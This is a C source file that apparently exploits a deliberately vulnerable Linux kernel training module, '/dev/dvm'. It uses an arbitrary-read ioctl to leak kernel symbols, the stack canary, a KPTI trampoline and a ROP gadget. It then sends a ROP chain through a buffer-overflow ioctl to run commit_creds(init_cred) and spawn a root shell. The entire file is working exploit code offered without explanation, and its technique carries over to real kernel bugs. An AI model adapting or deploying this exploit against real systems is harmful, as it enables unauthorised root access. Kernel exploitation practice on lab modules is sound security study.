#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>

#include <libuallsyms/uallsyms.h>

#define DVM_IOCTL_MAGIC 37
#define DVM_IOCTL_AAR _IOWR(DVM_IOCTL_MAGIC, 0, struct aar_req)
#define DVM_IOCTL_BOF _IOW(DVM_IOCTL_MAGIC, 1, struct bof_req)

#define __user

struct aar_req {
    void __user *to;
    void *from;
    unsigned int n;
};

struct bof_req {
    void __user *from;
    unsigned int n;
};

char g_buf[0x10000];

void die(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void spawn_shell(void)
{
    char *const argv[] = {
        "/bin/sh",
        NULL
    };

    execve("/bin/sh", argv, NULL);
    exit(0);
}

void do_rop(uas_t *uas)
{
    struct bof_req breq;
    uint64_t commit_creds;
    uint64_t init_cred;
    uint64_t kpti_trampoline;
    uint64_t pop_rdi;
    u64 canary;
    int mod_fd;
    int ret;

    mod_fd = open("/dev/dvm", O_RDWR);
    if (mod_fd < 0)
        die("open");

    commit_creds = uas_lookup_name(uas, "commit_creds");
    printf("[+] commit_creds: %#lx\n", commit_creds);

    init_cred = uas_lookup_name(uas, "init_cred");
    printf("[+] init_cred: %#lx\n", init_cred);

    canary = uas_resolve_canary(uas);
    printf("[+] canary: %#lx\n", canary);

    kpti_trampoline = uas_resolve_kpti_trampoline(uas);
    printf("[+] kpti_trampoline: %#lx\n", kpti_trampoline);

    pop_rdi = uas_resolve_pop_rdi(uas);
    printf("[+] pop_rdi: %#lx\n", pop_rdi);

    *(uint64_t *)(g_buf + 0x1) = canary; /* canary */
    *(uint64_t *)(g_buf + 0x9) = pop_rdi;
    *(uint64_t *)(g_buf + 0x11) = init_cred;
    *(uint64_t *)(g_buf + 0x19) = commit_creds;
    *(uint64_t *)(g_buf + 0x21) = kpti_trampoline;
    *(uint64_t *)(g_buf + 0x29) = 0;
    *(uint64_t *)(g_buf + 0x31) = 0; 
    *(uint64_t *)(g_buf + 0x39) = (uint64_t)spawn_shell; /* rip */ 
    *(uint64_t *)(g_buf + 0x41) = 0x33; /* cs */
    *(uint64_t *)(g_buf + 0x49) = 0x206; /* rflags */
    *(uint64_t *)(g_buf + 0x51) = (uint64_t)__builtin_frame_address(0); /* rsp */
    *(uint64_t *)(g_buf + 0x59) = 0x2b; /* ss */

    breq.from = g_buf;
    breq.n = 0x61;

    ret = ioctl(mod_fd, DVM_IOCTL_BOF, &breq);
    if (ret < 0)
        die("ioctl");
}

int dvm_aar(void *to, void *from, size_t n)
{
    struct aar_req areq;
    int mod_fd;
    int ret;

    mod_fd = open("/dev/dvm", O_RDWR);
    if (mod_fd < 0)
        return -1;

    areq.to = to;
    areq.from = from;
    areq.n = n;

    ret = ioctl(mod_fd, DVM_IOCTL_AAR, &areq);
    if (ret < 0)
        return -1;

    close(mod_fd);

    return ret;
}

int main(void)
{
    uas_t *uas;
    kaddr_t commit_creds;
    kaddr_t kpti_trampoline;
    kaddr_t pop_rdi;
    u64 canary;

    uas = uas_init(dvm_aar);
    
    do_rop(uas);
    
    return 0;
}

